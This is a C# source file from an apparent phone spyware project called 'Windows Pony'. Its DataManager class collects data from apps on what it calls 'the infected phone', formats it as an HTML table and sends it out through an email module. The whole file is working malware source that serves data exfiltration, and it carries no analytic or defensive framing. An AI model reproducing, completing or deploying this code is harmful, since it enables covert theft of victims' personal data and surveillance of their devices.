using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using Windows_Pony.Modules.BusinessLayer;

namespace Windows_Pony.Modules.DataAccessLayer
{
    public class DataManager : Module
    {
        private readonly string HEADER = "<html><head></head><body><table border='1'>";
        private readonly string TITLE = "<tr> <td> {|(||)} </td>  <td> {|(||)} </td>  <td> {|(||)} </td> </tr>";
        private readonly string FOOTER = "</table></body></html>";
        private readonly string BREAKLN = "<br/>";
        private readonly string TOKEN = @"\{\|\(\|\|\)\}";
        private string BODY = "";
        private string APPNAME = "Windows Pony";
        private string APPINFO = "Informations about the infected phone";
        private string DATETIME = "";
        private Regex regex;

        #region PUBLIC_METHODS

        public DataManager() { this.CheckStatus(); }

        public void CheckStatus() { regex = new Regex(this.TOKEN); }

        public void CloseSend()
        {
            this.BindData();
            SendEmail sendemail = (SendEmail)ModuleManagerFactoryPool.getModule("email");
            sendemail.Send(this.HEADER + this.BODY + this.FOOTER);
            this.BODY = "";
        }

        public void StartAddData(string app, string data)
        {
            if (this.APPNAME != app)
            {
                this.BindData();
                this.APPNAME = app;
                this.DATETIME = DateTime.Now.ToString("G");
            }
            this.APPINFO += data + this.BREAKLN;
        }

        #endregion


        #region PRIVATE_METHODS

        private void BindData()
        {
            string aux = this.TITLE;
            aux = this.ReplaceFirst(aux, this.APPNAME);
            aux = this.ReplaceFirst(aux, this.APPINFO);
            aux = this.ReplaceFirst(aux, this.DATETIME);
            this.BODY += aux;
            this.EraseStrings();
        }

        private void EraseStrings()
        {
            this.DATETIME = "";
            this.APPINFO = "";
            this.APPNAME = "";
        }

        private string ReplaceFirst(string target, string replace)
        {
            return this.regex.Replace(target,replace,1);
        }
        #endregion
    }
}
